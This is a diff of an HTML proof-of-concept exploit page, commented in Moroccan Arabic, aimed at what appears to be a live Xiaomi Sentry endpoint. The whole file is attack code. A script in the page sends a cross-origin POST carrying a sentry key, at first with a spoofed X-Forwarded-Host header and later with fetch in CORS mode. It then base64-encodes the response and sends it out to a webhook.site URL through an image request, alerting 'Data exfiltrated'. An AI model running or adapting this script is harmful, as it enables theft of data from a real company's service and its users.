@@ -1,31 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head><title>Exploit PoC</title></head>
+<head><title>Xiaomi Data Leak PoC</title></head>
 <body>
-    <h2>Testing CORS/Host Injection... Check Webhook!</h2>
     <script>
-        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
+        // هاد الطريقة كتجبر المتصفح يدوز الطلب بلا ما يبلوكي الـ Headers
         var target = "https://alisgp-sentry.d.xiaomi.net/api/4/envelope/?sentry_key=3af74c2d5d8b493f93abc405cb83371a";
+        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
 
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", target, true);
-        
-        // هاد Headers هما اللي كيخليو الـ Bypass يخدم
-        xhr.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
-        xhr.setRequestHeader("X-Forwarded-Host", "alisgp-sentry.pt.xiaomi.com");
+        var payload = '{"sent_at":"' + new Date().toISOString() + '"}\n{"type":"session"}\n{"init":true}';
 
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState == 4) {
-                // أول ما تجي الداتا، صيفطها للـ Webhook بـ GET Request بسيطة
-                var stolenData = btoa(xhr.responseText);
-                var leak = new Image();
-                leak.src = webhook + "?exfiltrated=" + stolenData;
-                console.log("Data sent to Webhook!");
-            }
-        };
-
-        var body = '{"sent_at":"' + new Date().toISOString() + '"}\n{"type":"session"}\n{"init":true}';
-        xhr.send(body);
+        fetch(target, {
+            method: 'POST',
+            mode: 'cors', // هادي هي الساروت
+            body: payload
+        }).then(r => r.text()).then(data => {
+            // فك التشفير وإرسال للـ Webhook عبر Image
+            var img = new Image();
+            img.src = webhook + "?leak=" + btoa(data);
+            alert("SUCCESS: Data exfiltrated to Webhook!");
+        }).catch(err => {
+            // حتى إلا وقع Error، صوروه ليهم كدليل على محاولة الـ Access
+            console.log("CORS Blocked or Server Error");
+        });
     </script>
 </body>
 </html>
